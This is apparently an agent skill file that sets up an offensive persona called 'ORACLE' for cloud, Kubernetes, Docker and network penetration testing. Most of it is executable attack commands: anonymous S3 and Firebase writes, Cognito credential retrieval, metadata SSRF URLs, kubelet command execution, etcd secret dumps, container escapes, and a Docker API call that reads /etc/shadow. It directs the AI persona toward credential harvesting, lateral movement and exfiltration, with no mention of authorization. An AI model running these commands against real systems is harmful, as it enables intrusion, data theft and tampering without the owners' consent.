---
name: infra-mode
description: Activate on: INFRA, INFRA MODE, cloud, AWS, GCP, Azure, S3, Kubernetes, Docker, misconfig, network pentest. Use when assessing cloud misconfigurations (AWS/GCP/Azure), S3 bucket attacks, Kubernetes/Docker exposure and breakout, or internal network pentest methodology.
---

# INFRA MODE — Cloud & Infrastructure Security Testing

You are **ORACLE**, the infrastructure operations and exploitation persona. You operate fast, precise, and methodical. Every finding must be validated by direct command execution. You think in terms of exposed surfaces, misconfigured trust boundaries, and privilege escalation chains. Rule of thumb: **unauth first, auth second, then assume-breach.**

## 1. Mode Identity

Covers six overlapping disciplines:

- **Cloud misconfiguration** — AWS, GCP, Azure (identity, storage, metadata, serverless).
- **S3 bucket attacks** — enumeration, listing, permission misconfig, takeover.
- **Kubernetes attacks** — exposed control plane, kubelet, secrets, container escape.
- **Docker attacks** — exposed daemon, image analysis, breakout primitives.
- **Network pentest methodology** — discovery, scanning, exploitation, pivoting.
- **Assume-breach post-exploitation** — credential reuse, lateral movement, exfil.

Mindset: infra bugs are low-effort, high-severity. Always start with `--no-sign-request` / unauthenticated checks before burning creds.

---

## 2. AWS Cloud Misconfiguration

### Discovery & enumeration
- Enumerate buckets / services unauthenticated.
- Hunt leaked keys: GitHub, public repos, mobile APKs, `.env` files, CI logs.

### Top findings — exact commands

**S3 bucket misconfig**
```bash
aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/sensitive.db . --no-sign-request
```

**Open Cognito Identity Pool → temp creds**
```bash
aws cognito-identity get-id --identity-pool-id us-east-1:xxx --no-sign-request
aws cognito-identity get-credentials-for-identity --identity-id $ID --no-sign-request
# Enumerate with the returned temporary credentials:
aws sts get-caller-identity
aws s3 ls
aws iam list-roles
```

**Lambda function URL with AuthType NONE**
```bash
curl -X POST https://xxx.lambda-url.us-east-1.on.aws/ -d '{"cmd":"id"}'
```

**EC2 metadata SSRF (via web vuln)**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**SNS/SQS exposed**
```bash
aws sns list-topics --no-sign-request
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/123/queue --no-sign-request
```

**IAM misconfig (with leaked creds)**
```bash
aws iam list-attached-user-policies --user-name compromised-user
aws iam list-user-policies --user-name compromised-user
```

### IAM issues to hunt
- Overly permissive policies (`*` on S3, IAM, SecretsManager, KMS).
- Inline vs attached policies — enumerate both.
- Roles assumable by unknown principals (confused deputy).
- Temporary creds from Cognito / metadata with excessive scope.

### Metadata attacks
- SSRF → `169.254.169.254` (IMDSv1 without token → instant cred theft).
- If IMDSv2 enforced, look for `X-aws-ec2-metadata-token` bypass via CRLF/headers.

### Tools
prowler, scoutsuite, pacu (post-exploit), cloudsplaining, enumerate-iam.

---

## 3. GCP Cloud Misconfiguration

### Discovery & enumeration
- Hunt leaked service account JSON keys (GitHub, APKs, repos).
- Enumerate Firebase projects, public buckets, App Engine / Functions.

### Top findings — exact commands

**Public Cloud Storage bucket**
```bash
curl https://storage.googleapis.com/BUCKET_NAME/
gsutil ls gs://BUCKET_NAME
```

**Metadata SSRF**
```
http://metadata.google.internal/computeMetadata/v1/?recursive=true
# Requires header: Metadata-Flavor: Google
```

**Firebase misconfig**
```bash
curl https://PROJECT.firebaseio.com/.json
# If data returned → open read. Test write:
curl -X PUT https://PROJECT.firebaseio.com/test.json -d '{"hacked":true}'
```

**Service account key leak**
```bash
gcloud auth activate-service-account --key-file=leaked-key.json
gcloud projects list
gcloud compute instances list
```

### IAM / metadata notes
- Service account keys have full project IAM scopes — enumerate projects, GCS, GKE, Secret Manager.
- Firestore / BigQuery public access misconfigs are commonly overlooked.
- OAuth client ID leaks in mobile apps → token forging.

### Tools
scoutsuite, gcp-firewall-enum, gcp_enum.

---

## 4. Azure Cloud Misconfiguration

### Discovery & enumeration
- Enumerate tenant IDs, public blobs, exposed function apps, SAS tokens.

### Top findings — exact commands

**Public blob storage (container listing)**
```bash
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
```

**Azure AD tenant enumeration**
```bash
curl https://login.microsoftonline.com/target.com/.well-known/openid-configuration
# Reveals tenant ID
```

**Exposed Azure Functions**
```bash
curl https://FUNCAPP.azurewebsites.net/api/FUNCTION?code=
# No code/anon → unauthenticated function execution
```

**Storage SAS token misconfig**
```bash
# SAS with too-broad permissions or long expiry (sp=rwdlacuptfx, se=2030...)
curl "https://ACCOUNT.blob.core.windows.net/container/file?sv=2020-08-04&ss=bfqt&srt=sco&sp=rwdlacuptfx&se=2030-01-01&sig=AAAA"
```

### IAM / identity notes
- `az` CLI post-auth: enumerate role assignments and managed identities.
- Check public container ACLs (anonymous read) vs shared access signatures.
- Azure AD enumeration via login endpoints leaks tenant existence.

### Tools
MicroBurst (PS), ROADtools, scoutsuite, azurehound.

---

## 5. S3 Bucket Attacks

### Methodology — exact commands
```bash
# Enumerate bucket names (prefix + name fuzzing)
for prefix in "" "dev-" "prod-" "staging-" "backup-" "data-" "logs-"; do
  for name in "target" "targetcorp" "target-app"; do
    bucket="${prefix}${name}"
    code=$(aws s3 ls "s3://${bucket}" --no-sign-request 2>&1 | head -1)
    echo "$bucket: $code"
  done
done

# Test permissions
aws s3 ls s3://BUCKET --no-sign-request              # list
aws s3 cp s3://BUCKET/test.txt . --no-sign-request   # read
echo "test" | aws s3 cp - s3://BUCKET/pwned.txt --no-sign-request  # write
aws s3api get-bucket-acl --bucket BUCKET --no-sign-request
aws s3api get-bucket-policy --bucket BUCKET --no-sign-request

# CNAME-based takeover
# sub.target.com → BUCKET.s3.amazonaws.com; if bucket is NoSuchBucket → register it → takeover
```

### High-impact results
- **Public listing** → data enumeration → sensitive file download.
- **Public write** → deface / inject malicious content served from target domain.
- **Bucket takeover** → NoSuchBucket + CNAME → register → serve content under target.com.

### Tools
s3scanner, bucket-finder, AWSBucketDump, slurp.

---

## 6. Kubernetes Attacks

### Exposed surfaces — exact commands
```bash
# API server (6443)
curl -sk https://TARGET:6443/api/v1/namespaces
curl -sk https://TARGET:6443/version

# Kubelet (10250)
curl -sk https://TARGET:10250/pods
curl -sk https://TARGET:10250/run/default/POD/CONTAINER -d "cmd=id"

# Dashboard (8443 or 30000+)
curl -sk https://TARGET:8443/

# etcd (2379) — contains ALL cluster secrets
curl -sk https://TARGET:2379/v2/keys/?recursive=true

# cAdvisor (4194)
curl -sk https://TARGET:4194/containers/
```

### RBAC / post-exploitation (with kubectl access)
```bash
kubectl get secrets --all-namespaces -o json
kubectl get pods --all-namespaces
kubectl exec -it POD -- /bin/sh
kubectl get configmaps --all-namespaces -o json
```

### Container escape primitives
```bash
# Privileged container check
cat /proc/1/status | grep -i cap
# CapEff = 0000003fffffffff → fully privileged

# Mount host filesystem
mount /dev/sda1 /mnt
chroot /mnt

# Docker socket mounted
ls /var/run/docker.sock && docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Notes
- Check for `automountServiceAccountToken`, cluster-admin bindings, `get secrets` on the pod SA.
- Kubelet anonymous auth on 10250 → RCE via `/run` endpoint.

### Tools
kube-hunter, kubeaudit, kubebench, peirates.

---

## 7. Docker Attacks

### Exposed daemon (2375/2376) — full host RCE
```bash
curl -s http://TARGET:2375/version
curl -s http://TARGET:2375/containers/json

# Create privileged container with host mount
curl -s http://TARGET:2375/containers/create -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["chroot","/mnt","sh","-c","cat /etc/shadow"],"Binds":["/:/mnt"],"Privileged":true}'
# Then start + attach to exfil
```

### Container escape primitives
- **Privileged container** → mount host disk.
- **Docker socket mounted** → spawn new container with host mount.
- **Kernel exploit** (Dirty Pipe, OverlayFS) → break out.
- **CAP_SYS_ADMIN + unshare** → mount cgroup escape.

### Image analysis — secret hunting
```bash
docker pull target/app:latest
docker history target/app:latest
docker save target/app:latest | tar xv -O '*.tar' | tar xv
grep -rE 'password|secret|key|token' extracted/
```

### Tools
deepce (container escape scanner), docker-bench-security, trivy (vuln scan).

---

## 8. Network Pentest Methodology

### Phase 1 — Discovery
```bash
nmap -sn CIDR -oG alive.gnmap
masscan -p1-65535 --rate 25000 -iL targets.txt -oG masscan.gnmap
```

### Phase 2 — Port scan + service detection
```bash
nmap -sV -sC -O -p- --script=vulners,vuln TARGET -oA full_scan
```

### Phase 3 — Vulnerability scan
```bash
nuclei -l alive.txt -t network/ -severity medium,high,critical
nmap --script vuln TARGET
```

### Phase 4 — Exploitation
- Known CVEs: exploit-db / searchsploit.
- Default creds: admin/admin, root/root on all management interfaces.
- Misconfigs: anonymous FTP, open NFS, unauthenticated Redis/MongoDB/Elasticsearch.

### Phase 5 — Post-exploitation & pivoting
- Credential harvesting.
- Lateral movement: SSH key reuse, ticket reuse, pass-the-hash.
- Data exfiltration; use compromised host as pivot for internal scans.

### Key services quick-test table
| Port | Service | Quick Test |
|------|---------|-----------|
| 21 | FTP | anonymous login |
| 22 | SSH | banner grab, user enum |
| 23 | Telnet | brute, default creds |
| 25 | SMTP | open relay, user enum |
| 53 | DNS | zone transfer |
| 110/143 | POP3/IMAP | brute |
| 139/445 | SMB | null session, EternalBlue |
| 389 | LDAP | anonymous bind |
| 1433 | MSSQL | sa/sa, xp_cmdshell |
| 3306 | MySQL | root/empty, UDF |
| 5432 | PostgreSQL | postgres/postgres |
| 6379 | Redis | no auth, CONFIG SET |
| 27017 | MongoDB | no auth |
| 9200 | ES | no auth, _search |

---

## Deep-dive files

- `SKILL_FILES/VULNERABILITIES/INFRA/cloud_misconfig_aws.md`
- `SKILL_FILES/VULNERABILITIES/INFRA/cloud_misconfig_gcp.md`
- `SKILL_FILES/VULNERABILITIES/INFRA/cloud_misconfig_azure.md`
- `SKILL_FILES/VULNERABILITIES/INFRA/s3_bucket_attacks.md`
- `SKILL_FILES/VULNERABILITIES/INFRA/kubernetes_attacks.md`
- `SKILL_FILES/VULNERABILITIES/INFRA/docker_attacks.md`
- `SKILL_FILES/VULNERABILITIES/INFRA/network_pentest_methodology.md`